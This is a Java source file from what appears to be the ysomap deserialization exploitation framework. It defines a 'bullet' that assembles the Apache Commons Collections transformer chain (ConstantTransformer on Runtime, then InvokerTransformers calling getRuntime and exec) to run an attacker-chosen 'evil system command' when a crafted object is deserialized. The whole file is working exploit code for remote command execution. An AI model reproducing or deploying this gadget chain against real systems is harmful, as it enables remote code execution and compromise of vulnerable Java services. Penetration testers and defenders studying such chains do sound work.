package ysomap.gadget.bullet.collections;

import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;
import ysomap.gadget.bullet.Bullet;
import ysomap.util.Reflections;

import java.lang.reflect.Array;
import java.util.LinkedList;

/**
 * @author wh1t3P1g
 * @since 2020/2/16
 */
@SuppressWarnings ( "rawtypes" )
@Dependencies({"*"})
@Authors({ Authors.WH1T3P1G })
public class TransformerBullet extends Bullet<Object> {

    @Require(name="args",detail="evil system command")
    public String args;
    @Require(name="version", type="int", detail = "commons-collections version, plz choose 3 or 4")
    public String version = "3";// 默认生成commonscollections 3.2.1

    public Class transformerClazz;

    public Class constantTransformerClazz;

    public Class invokerTransformerClazz;

    @Override
    public Object getObject() throws Exception {
        initClazz();
        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(Runtime.class));
        transformers.add(createInvokerTransformer("getMethod", new Class[] {String.class, Class[].class },
                            new Object[] {"getRuntime", new Class[0] }));
        transformers.add(createInvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {
                null, new Object[0] }));
        transformers.add(createInvokerTransformer(
                "exec", new Class[] { String.class }, new String[]{args}));
        transformers.add(createConstantTransformer(1));

        return createTransformerArray(transformers);
    }

    public void setArgs(String args) {
        this.args = args;
    }

    public void setVersion(String version) {
        this.version = version;
    }

    public void initClazz() throws ClassNotFoundException {
        try{
            if(version.equals("3")){
                transformerClazz = Class.forName("org.apache.commons.collections.Transformer");
                constantTransformerClazz = Class.forName("org.apache.commons.collections.functors.ConstantTransformer");
                invokerTransformerClazz = Class.forName("org.apache.commons.collections.functors.InvokerTransformer");
            }else{
                transformerClazz = Class.forName("org.apache.commons.collections4.Transformer");
                constantTransformerClazz = Class.forName("org.apache.commons.collections4.functors.ConstantTransformer");
                invokerTransformerClazz = Class.forName("org.apache.commons.collections4.functors.InvokerTransformer");
            }
        }catch(ClassNotFoundException e){
            e.printStackTrace();
        }
    }

    public Object createTransformerArray(LinkedList<Object> transformers) throws ClassNotFoundException {
        Object transformerArray =
                Array.newInstance(transformerClazz, transformers.size());
        for(int i=0; i< transformers.size(); i++){
            Array.set(transformerArray, i, transformers.get(i));
        }
        return transformerArray;
    }

    public Object createConstantTransformer(Object args) throws Exception {
        return Reflections.newInstance(constantTransformerClazz.getName(), new Class[]{Object.class}, args);
    }

    public Object createInvokerTransformer(Object... args) throws Exception {
        return Reflections.newInstance(invokerTransformerClazz.getName(),
                            new Class[]{String.class, Class[].class, Object[].class},
                            args);
    }
}
